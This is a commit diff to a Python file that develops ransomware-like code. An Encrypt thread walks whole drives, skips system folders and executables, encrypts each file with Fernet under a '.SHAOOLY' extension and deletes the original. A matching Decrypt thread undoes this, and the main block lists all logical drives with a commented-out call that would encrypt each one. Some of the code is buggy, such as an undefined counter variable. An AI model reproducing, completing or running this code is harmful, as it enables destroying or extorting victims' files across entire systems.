?
working on the afternnonon

+++ main.py
@@ -6,14 +6,15 @@ import time
 
 
 class Encrypt(threading.Thread):
-    def __init__(self, key, drive):
-        self.key = key
+    global fernet
+    def __init__(self, drive):
         self.drive = drive
 
     def run(self):
+        global fernet
         start = time.perf_counter()
         for r, d, f in os.walk(self.drive):
-            if r.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)"]:
+            if r.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
                 for file in f:
                     if file.split(".")[-1] not in ["iso", "exe", "dll"]:
                         filepath = os.path.join(r, file)
@@ -22,15 +23,11 @@ class Encrypt(threading.Thread):
                         else:
                             file_extension = file.split(".")[-1]
                         file_name = file.split(".")[0]
-                        enc_file_name = f'{r}\{file_name}.SHAOOLY'
-                        fernet = Fernet(self.key)
+                        enc_file_name = f'{r}/{file_name}.SHAOOLY'
                         byte_file = open(filepath, 'rb')
                         enc_file_content = fernet.encrypt(byte_file.read())
-                        i = 0
-                        while os.path.exists(enc_file_name):
-                            i += 1
-                            enc_file_name = f'{r}{file_name}{i}.SHAOOLY'
-                        encrypted_file = open(enc_file_name, 'w')
+                        enc_file_name = f'{r}{file_name}{i}.SHAOOLY'
+                        encrypted_file = open(enc_file_name, 'x')
                         encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                         byte_file.close()
                         os.remove(filepath)
@@ -39,44 +36,35 @@ class Encrypt(threading.Thread):
 
 
 class Decrypt(threading.Thread):
-    def __init__(self, key, drive):
-        self.key = key
+    def __init__(self, drive):
         self.drive = drive
 
     def run(self):
-        start = time.perf_counter()
+        global fernet
         for r, d, f in os.walk(self.drive):
             for file in f:
                 filepath = os.path.join(r, file)
                 filename = filepath.split('/')[-1].split(".")[0]
-                fernet = Fernet(key)
-                enc_file = open(filepath, 'r')
-                file_content = enc_file.read().split('\n')
-                ext = file_content[0]
-                file_name_with_ext = f'{filename}.{ext}'
-                dec_file = open(file_name_with_ext, 'wb')
-                dec_file.write(fernet.decrypt(file_content[1].encode()))
-                enc_file.close()
-                os.remove(filepath)
+                if filepath.split('/')[-1].split(".")[-1] == "SHAOOLY":
+                    enc_file = open(filepath, 'r')
+                    file_content = enc_file.read().split('\n')
+                    ext = file_content[0]
+                    file_name_with_ext = f'{filename}.{ext}'
+                    dec_file = open(file_name_with_ext, 'wb')
+                    dec_file.write(fernet.decrypt(file_content[1].encode()))
+                    enc_file.close()
+                    os.remove(filepath)
 
 
-def decrypt_data(filepath, key):
-    filename = filepath.split('/')[-1].split(".")[0]
+if __name__ == "__main__":
+    key = open("key.txt", 'rb').read()
     fernet = Fernet(key)
-    enc_file = open(filepath, 'r')
-    file_content = enc_file.read().split('\n')
-    ext = file_content[0] 
-    file_name_with_ext = f'{filename}.{ext}'
-    dec_file = open(file_name_with_ext, 'wb')
-    dec_file.write(fernet.decrypt(file_content[1].encode()))
-    enc_file.close()
-    os.remove(filepath)
-
-
-
-key = open("key.txt", 'rb').read()
-# encrypt = Encrypt(key, r"C:\Users\shaoo\Desktop\lidan")
+    drives = win32api.GetLogicalDriveStrings()
+    drives = drives.split('\000')[:-1]
+    for drive in drives:
+        pass
+        # Encrypt(drive).run()
+# encrypt = Encrypt(r"C:\Users\shaoo\Desktop\lidan")
 # encrypt.run()
-dec = Decrypt(key, r"C:\Users\shaoo\Desktop\lidan")
-dec.run()
-print("hello")
+# dec = Decrypt(r"C:\Users\shaoo\Desktop\lidan")
+# dec.run()
